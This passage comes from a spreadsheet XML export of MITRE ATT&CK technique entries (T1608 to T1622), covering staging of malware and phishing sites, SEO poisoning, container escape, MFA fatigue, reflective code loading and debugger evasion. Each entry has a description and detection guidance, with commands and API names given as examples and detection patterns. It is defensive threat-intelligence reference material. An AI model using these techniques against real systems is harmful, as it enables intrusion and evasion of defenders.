    <t>Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)
Staging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):
* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)
* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)
* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)
* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)</t>
  </si>
  <si>
    <t>If infrastructure or patterns in malware, tooling, certificates, or malicious web content have been previously identified, internet scanning may uncover when an adversary has staged their capabilities.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as initial access and post-compromise behaviors.</t>
  </si>
  <si>
    <t>T1608.001</t>
  </si>
  <si>
    <t>Upload Malware (T1608.001)</t>
  </si>
  <si>
    <t>Adversaries may upload malware to third-party or adversary controlled infrastructure to make it accessible during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, and a variety of other malicious content. Adversaries may upload malware to support their operations, such as making a payload available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.
Malware may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Malware can also be staged on web services, such as GitHub or Pastebin, or hosted on the InterPlanetary File System (IPFS), where decentralized content storage makes the removal of malicious files difficult.(Citation: Volexity Ocean Lotus November 2020)(Citation: Talos IPFS 2022)
Adversaries may upload backdoored files, such as application binaries, virtual machine images, or container images, to third-party software stores or repositories (ex: GitHub, CNET, AWS Community AMIs, Docker Hub). By chance encounter, victims may directly download/install these backdoored files via [User Execution](https://attack.mitre.org/techniques/T1204). [Masquerading](https://attack.mitre.org/techniques/T1036) may increase the chance of users mistakenly executing these files.</t>
  </si>
  <si>
    <t>If infrastructure or patterns in malware have been previously identified, internet scanning may uncover when an adversary has staged malware to make it accessible for targeting.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [User Execution](https://attack.mitre.org/techniques/T1204) or [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).</t>
  </si>
  <si>
    <t>T1608.002</t>
  </si>
  <si>
    <t>Upload Tool (T1608.002)</t>
  </si>
  <si>
    <t>Adversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) by placing it on an Internet accessible web server.
Tools may be placed on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).(Citation: Dell TG-3390) Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Intezer App Service Phishing)
Adversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.</t>
  </si>
  <si>
    <t>If infrastructure or patterns in tooling have been previously identified, internet scanning may uncover when an adversary has staged tools to make them accessible for targeting.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on post-compromise phases of the adversary lifecycle, such as [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).</t>
  </si>
  <si>
    <t>T1608.003</t>
  </si>
  <si>
    <t>Install Digital Certificate (T1608.003)</t>
  </si>
  <si>
    <t>Adversaries may install SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are files that can be installed on servers to enable secure communications between systems. Digital certificates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securely with its owner. Certificates can be uploaded to a server, then the server can be configured to use the certificate to enable encrypted communication with it.(Citation: DigiCert Install SSL Cert)
Adversaries may install SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or lending credibility to a credential harvesting site. Installation of digital certificates may take place for a number of server types, including web servers and email servers. 
Adversaries can obtain digital certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) or create self-signed certificates (see [Digital Certificates](https://attack.mitre.org/techniques/T1587/003)). Digital certificates can then be installed on adversary controlled infrastructure that may have been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).</t>
  </si>
  <si>
    <t>Consider use of services that may aid in the tracking of certificates in use on sites across the Internet. In some cases it may be possible to pivot on known pieces of certificate information to uncover other adversary infrastructure.(Citation: Splunk Kovar Certificates 2017)
Detection efforts may be focused on related behaviors, such as [Web Protocols](https://attack.mitre.org/techniques/T1071/001) or [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002).</t>
  </si>
  <si>
    <t>T1608.004</t>
  </si>
  <si>
    <t>Drive-by Target (T1608.004)</t>
  </si>
  <si>
    <t>Adversaries may prepare an operational environment to infect systems that visit a website over the normal course of browsing. Endpoint systems may be compromised through browsing to adversary controlled sites, as in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). In such cases, the user's web browser is typically targeted for exploitation (often not requiring any extra user interaction once landing on the site), but adversaries may also set up websites for non-exploitation behavior such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior to [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries must stage resources needed to deliver that exploit to users who browse to an adversary controlled site. Drive-by content can be staged on adversary controlled infrastructure that has been acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or previously compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).
Adversaries may upload or inject malicious web content, such as [JavaScript](https://attack.mitre.org/techniques/T1059/007), into websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) This may be done in a number of ways, including:
* Inserting malicious scripts into web pages or other user controllable web content such as forum posts
* Modifying script files served to websites from publicly writeable cloud storage buckets
* Crafting malicious web advertisements and purchasing ad space on a website through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))
In addition to staging content to exploit a user's web browser, adversaries may also stage scripting content to profile the user's browser (as in [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) to ensure it is vulnerable prior to attempting exploitation.(Citation: ATT ScanBox)
Websites compromised by an adversary and used to stage a drive-by may be ones visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is referred to a strategic web compromise or watering hole attack.
Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189).</t>
  </si>
  <si>
    <t>If infrastructure or patterns in the malicious web content utilized to deliver a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) have been previously identified, internet scanning may uncover when an adversary has staged web content for use in a strategic web compromise.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).</t>
  </si>
  <si>
    <t>T1608.005</t>
  </si>
  <si>
    <t>Link Target (T1608.005)</t>
  </si>
  <si>
    <t>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click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) or a phish to gain initial access to a system (as in [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), an adversary must set up the resources for a link target for the spearphishing link. 
Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries may also [Upload Malware](https://attack.mitre.org/techniques/T1608/001) and have the link target point to malware for download/execution by the user.
Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) to help facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001).
Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.(Citation: Kaspersky-masking)(Citation: mandiant-masking)
Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing)(Citation: Cofense-redirect) In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links).(Citation: iOS URL Scheme)(Citation: URI)(Citation: URI Use)(Citation: URI Unique) Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System (IPFS) to host link targets that are difficult to remove.(Citation: Talos IPFS 2022)</t>
  </si>
  <si>
    <t>If infrastructure or patterns in malicious web content have been previously identified, internet scanning may uncover when an adversary has staged web content to make it accessible for targeting.
Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on other phases of the adversary lifecycle, such as during [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003), [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002), or [Malicious Link](https://attack.mitre.org/techniques/T1204/001).</t>
  </si>
  <si>
    <t>T1608.006</t>
  </si>
  <si>
    <t>SEO Poisoning (T1608.006)</t>
  </si>
  <si>
    <t>Adversaries may poison mechanisms that influence search engine optimization (SEO) to further lure staged capabilities towards potential victims. Search engines typically display results to users based on purchased ads as well as the site’s ranking/score/reputation calculated by their web crawlers and algorithms.(Citation: Atlas SEO)(Citation: MalwareBytes SEO)
To help facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries may stage content that explicitly manipulates SEO rankings in order to promote sites hosting their malicious payloads (such as [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)) within search engines. Poisoning SEO rankings may involve various tricks, such as stuffing keywords (including in the form of hidden text) into compromised sites. These keywords could be related to the interests/browsing habits of the intended victim(s) as well as more broad, seasonably popular topics (e.g. elections, trending news).(Citation: ZScaler SEO)(Citation: Atlas SEO)
In addition to internet search engines (such as Google), adversaries may also aim to manipulate specific in-site searches for developer platforms (such as GitHub) to deceive users towards [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) lures. In-site searches will rank search results according to their own algorithms and metrics such as popularity(Citation: Chexmarx-seo) which may be targeted and gamed by malicious actors.(Citation: Checkmarx-oss-seo)
Adversaries may also purchase or plant incoming links to staged capabilities in order to boost the site’s calculated relevance and reputation.(Citation: MalwareBytes SEO)(Citation: DFIR Report Gootloader)
SEO poisoning may also be combined with evasive redirects and other cloaking mechanisms (such as measuring mouse movements or serving content based on browser user agents, user language/localization settings, or HTTP headers) in order to feed SEO inputs while avoiding scrutiny from defenders.(Citation: ZScaler SEO)(Citation: Sophos Gootloader)</t>
  </si>
  <si>
    <t>T1609</t>
  </si>
  <si>
    <t>Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)
In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as &lt;code&gt;docker exec&lt;/code&gt; to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as &lt;code&gt;kubectl exec&lt;/code&gt;.(Citation: Kubectl Exec Get Shell)</t>
  </si>
  <si>
    <t xml:space="preserve">Container administration service activities and executed commands can be captured through logging of process execution with command-line arguments on the container and the underlying host. In Docker, the daemon log provides insight into events at the daemon and container service level. Kubernetes system component logs may also detect activities running in and out of containers in the cluster. </t>
  </si>
  <si>
    <t>T1610</t>
  </si>
  <si>
    <t>Defense Evasion, Execution</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Container: Container Creation, Container: Container Start, Pod: Pod Creation, Pod: Pod Modification</t>
  </si>
  <si>
    <t>Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)
Containers can be deployed by various means, such as via Docker's &lt;code&gt;create&lt;/code&gt; and &lt;code&gt;start&lt;/code&gt; APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)</t>
  </si>
  <si>
    <t>Monitor for suspicious or unknown container images and pods in your environment. Deploy logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application pods to detect malicious activity at the cluster level. In Docker, the daemon log provides insight into remote API calls, including those that deploy containers. Logs for management services or applications used to deploy containers other than the native technologies themselves should also be monitored.</t>
  </si>
  <si>
    <t>T1611</t>
  </si>
  <si>
    <t>Container: Container Creation, Kernel: Kernel Module Load, Process: OS API Execution, Process: Process Creation, Volume: Volume Modification</t>
  </si>
  <si>
    <t>Containers, Linux, Windows</t>
  </si>
  <si>
    <t>Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)
There are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)
Additionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)
Gaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.</t>
  </si>
  <si>
    <t>Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as &lt;code&gt;mount&lt;/code&gt; (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.</t>
  </si>
  <si>
    <t>T1612</t>
  </si>
  <si>
    <t>Image: Image Creation, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may build a container image directly on a host to bypass defenses that monitor for the retrieval of malicious images from a public registry. A remote &lt;code&gt;build&lt;/code&gt; request may be sent to the Docker API that includes a Dockerfile that pulls a vanilla base image, such as alpine, from a public or local registry and then builds a custom image upon it.(Citation: Docker Build Image)
An adversary may take advantage of that &lt;code&gt;build&lt;/code&gt; API to build a custom image on the host that includes malware downloaded from their C2 server, and then they may utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) using that custom image.(Citation: Aqua Build Images on Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) If the base image is pulled from a public registry, defenses will likely not detect the image as malicious since it’s a vanilla image. If the base image already resides in a local registry, the pull may be considered even less suspicious since the image is already in the environment. </t>
  </si>
  <si>
    <t>Monitor for unexpected Docker image build requests to the Docker daemon on hosts in the environment. Additionally monitor for subsequent network communication with anomalous IPs that have never been seen before in the environment that indicate the download of malicious code.</t>
  </si>
  <si>
    <t>T1613</t>
  </si>
  <si>
    <t>Container: Container Enumeration, Pod: Pod Enumeration</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.
These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.(Citation: Docker API)(Citation: Kubernetes API) In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution. </t>
  </si>
  <si>
    <t xml:space="preserve">Establish centralized logging for the activity of container and Kubernetes cluster components. This can be done by deploying logging agents on Kubernetes nodes and retrieving logs from sidecar proxies for application pods to detect malicious activity at the cluster level.
Monitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications. </t>
  </si>
  <si>
    <t>T1614</t>
  </si>
  <si>
    <t xml:space="preserve">
Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as &lt;code&gt;GetLocaleInfoW&lt;/code&gt; can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)
Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016)</t>
  </si>
  <si>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location information. Remote access tools with built-in features may interact directly with the Windows API, such as calling &lt;code&gt; GetLocaleInfoW&lt;/code&gt; to gather information.(Citation: FBI Ragnar Locker 2020)
Monitor traffic flows to geo-location service provider sites, such as ip-api and ipinfo.</t>
  </si>
  <si>
    <t>T1614.001</t>
  </si>
  <si>
    <t>System Language Discovery (T1614.001)</t>
  </si>
  <si>
    <t>Adversaries may attempt to gather information about the system language of a victim in order to infer the geographical location of that host. This information may be used to shape follow-on behaviors, including whether the adversary infects the target and/or attempts specific actions. This decision may be employed by malware developers and operators to reduce their risk of attracting the attention of specific law enforcement agencies or prosecution/scrutiny from other entities.(Citation: Malware System Language Check)
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API](https://attack.mitre.org/techniques/T1106) functions.(Citation: CrowdStrike Ryuk January 2019) 
For example, on a Windows system adversaries may attempt to infer the language of a system by querying the registry key &lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\Language&lt;/code&gt; or parsing the outputs of Windows API functions &lt;code&gt;GetUserDefaultUILanguage&lt;/code&gt;, &lt;code&gt;GetSystemDefaultUILanguage&lt;/code&gt;, &lt;code&gt;GetKeyboardLayoutList&lt;/code&gt; and &lt;code&gt;GetUserDefaultLangID&lt;/code&gt;.(Citation: Darkside Ransomware Cybereason)(Citation: Securelist JSWorm)(Citation: SecureList SynAck Doppelgänging May 2018)
On a macOS or Linux system, adversaries may query &lt;code&gt;locale&lt;/code&gt; to retrieve the value of the &lt;code&gt;$LANG&lt;/code&gt; environment variable.</t>
  </si>
  <si>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language information. This may include calls to various API functions and interaction with system configuration settings such as the Windows Registry.</t>
  </si>
  <si>
    <t>T1615</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Access, Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>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`\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)
Adversaries may use commands such as &lt;code&gt;gpresult&lt;/code&gt; or various publicly available PowerShell functions, such as &lt;code&gt;Get-DomainGPO&lt;/code&gt; and &lt;code&gt;Get-DomainGPOLocalGroup&lt;/code&gt;, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.</t>
  </si>
  <si>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for suspicious use of &lt;code&gt;gpresult&lt;/code&gt;. Monitor for the use of PowerShell functions such as &lt;code&gt;Get-DomainGPO&lt;/code&gt; and &lt;code&gt;Get-DomainGPOLocalGroup&lt;/code&gt; and processes spawning with command-line arguments containing &lt;code&gt;GPOLocalGroup&lt;/code&gt;.
Monitor for abnormal LDAP queries with filters for &lt;code&gt;groupPolicyContainer&lt;/code&gt; and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.</t>
  </si>
  <si>
    <t>T1619</t>
  </si>
  <si>
    <t>Cloud Storage: Cloud Storage Access, Cloud Storage: Cloud Storage Enumeration</t>
  </si>
  <si>
    <t>Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) on a local host, after identifying available storage services (i.e. [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries may access the contents/objects stored in cloud infrastructure.
Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS (Citation: ListObjectsV2) and List Blobs in Azure(Citation: List Blobs) .</t>
  </si>
  <si>
    <t xml:space="preserve">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 
Monitor cloud logs for API calls used for file or object enumeration for unusual activity. </t>
  </si>
  <si>
    <t>T1620</t>
  </si>
  <si>
    <t>Module: Module Load, Process: OS API Execution, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)).
Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode).(Citation: Introducing Donut)(Citation: S1 Custom Shellcode Tool)(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Mandiant BYOL) For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process.(Citation: Microsoft AssemblyLoad)
Reflective code injection is very similar to [Process Injection](https://attack.mitre.org/techniques/T1055) except that the “injection” loads code into the processes’ own memory instead of that of a separate process. Reflective loading may evade process-based detections since the execution of the arbitrary code may be masked within a legitimate or otherwise benign process. Reflectively loading payloads directly into memory may also avoid creating files or other artifacts on disk, while also enabling malware to keep these payloads encrypted (or otherwise obfuscated) until execution.(Citation: Stuart ELF Memory)(Citation: 00sec Droppers)(Citation: Intezer ACBackdoor)(Citation: S1 Old Rat New Tricks)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor for code artifacts associated with reflectively loading code, such as the abuse of .NET functions such as &lt;code&gt;Assembly.Load()&lt;/code&gt; and [Native API](https://attack.mitre.org/techniques/T1106) functions such as &lt;code&gt;CreateThread()&lt;/code&gt;, &lt;code&gt;memfd_create()&lt;/code&gt;, &lt;code&gt;execve()&lt;/code&gt;, and/or &lt;code&gt;execveat()&lt;/code&gt;.(Citation: 00sec Droppers)(Citation: S1 Old Rat New Tricks)
Monitor for artifacts of abnormal process execution. For example, a common signature related to reflective code loading on Windows is mechanisms related to the .NET Common Language Runtime (CLR) -- such as mscor.dll, mscoree.dll, and clr.dll -- loading into abnormal processes (such as notepad.exe). Similarly, AMSI / ETW traces can be used to identify signs of arbitrary code execution from within the memory of potentially compromised processes.(Citation: MDSec Detecting DOTNET)(Citation: Introducing Donut)
Analyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. </t>
  </si>
  <si>
    <t>T1621</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication</t>
  </si>
  <si>
    <t>Adversaries may attempt to bypass multi-factor authentication (MFA) mechanisms and gain access to accounts by generating MFA requests sent to users.
Adversaries in possession of credentials to [Valid Accounts](https://attack.mitre.org/techniques/T1078) may be unable to complete the login process if they lack access to the 2FA or MFA mechanisms required as an additional credential and security control. To circumvent this, adversaries may abuse the automatic generation of push notifications to MFA services such as Duo Push, Microsoft Authenticator, Okta, or similar services to have the user grant access to their account. If adversaries lack credentials to victim accounts, they may also abuse automatic push notification generation when this option is configured for self-service password reset (SSPR).(Citation: Obsidian SSPR Abuse 2023)
In some cases, adversaries may continuously repeat login attempts in order to bombard users with MFA push notifications, SMS messages, and phone calls, potentially resulting in the user finally accepting the authentication request in response to “MFA fatigue.”(Citation: Russian 2FA Push Annoyance - Cimpanu)(Citation: MFA Fatigue Attacks - PortSwigger)(Citation: Suspected Russian Activity Targeting Government and Business Entities Around the Globe)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor user account logs as well as 2FA/MFA application logs for suspicious events: unusual login attempt source location, mismatch in location of login attempt and smart device receiving 2FA/MFA request prompts, and high volume of repeated login attempts, all of which may indicate user's primary credentials have been compromised minus 2FA/MFA mechanism. </t>
  </si>
  <si>
    <t>T1622</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Command: Command Execution, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)
Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.
Specific checks will vary based on the target and/or adversary, but may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as &lt;code&gt;IsDebuggerPresent()&lt;/code&gt; and &lt;code&gt; NtQueryInformationProcess()&lt;/code&gt;, or manually checking the &lt;code&gt;BeingDebugged&lt;/code&gt; flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)
Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as &lt;code&gt;OutputDebugStringW()&lt;/code&gt;.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)</t>
  </si>
  <si>
